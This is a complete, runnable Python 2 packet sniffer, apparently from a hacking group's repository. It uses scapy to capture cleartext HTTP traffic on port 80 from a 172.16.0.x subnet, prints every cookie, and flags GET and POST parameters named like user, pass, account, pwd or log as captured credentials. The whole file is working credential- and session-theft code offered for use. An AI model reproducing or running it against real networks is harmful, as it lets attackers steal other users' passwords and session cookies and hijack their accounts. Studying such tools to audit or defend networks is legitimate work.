#!/usr/bin/env python
#! Copyright (C) 2015-2015 Hack Stuff. All right reserved.
#
# Author : 2015/05 cmj<cmj@cmj.tw>

import os
import sys
import socket

import mimetools
from StringIO import StringIO

import logging
# disable scapy ipv6 warning
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

local_ip = "172.16.0."
keywords = ["user", "pass", "account", "pwd", "log"]

def dump_info(data):
    params = data.split("&")

    for keyword in keywords:
        for param in params:
            if param.startswith(keyword):
                print "  \033[1;31m[CAPTURED] \033[1;m" + param

def dump_cookie(data):
    for cookie in data.split(";"):
        print "  \033[1;33m[COOKIE] \033[1;m" + cookie.strip()

def http_handler(packet):

    if IP in packet and packet[IP].src.startswith(local_ip):
        request = str(packet[TCP].payload)

        if request.startswith("GET") or request.startswith("POST"):
            #print packet.summary()

            # Get method, request path, query string, post data
            request_head, http_headers = request.split("\r\n", 1)
            http_headers, post_data = http_headers.split("\r\n\r\n", 1)

            request_method, request_path, http_version = request_head.split(" ")

            if "?" in request_path:
                request_path, request_param = request_path.split("?")
            else:
                request_param = None

            # Parse http headers
            headers = mimetools.Message(StringIO(http_headers))

            print "\033[1;32m[HTTP]\033[1;m %-15s => %-15s %-4s %s%s" % ( packet[IP].src, packet[IP].dst, request_method , headers["host"], request_path )

            if "Cookie" in headers:
                dump_cookie(headers["Cookie"])

            if request_method == "GET":
                if request_param:
                    dump_info(request_param)

            elif request_method == "POST":
                if headers["Content-Type"] == "application/x-www-form-urlencoded":
                    dump_info(post_data)
        else:
            print "\033[1;32m[HTTP]\033[1;m %-15s => %-15s RAW " % ( packet[IP].src, packet[IP].dst )
            dump_info(request)


if __name__ == '__main__':
    if os.geteuid() != 0:
        exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")

    if len(sys.argv) != 2:
        exit("Usage: %s <interface>" % sys.argv[0])

    interface = sys.argv[1]
    print "\033[1;36mSniffing on %s...\033[1;m" % interface

    sniff(iface=interface, filter="tcp and port 80", prn=http_handler, store=0)

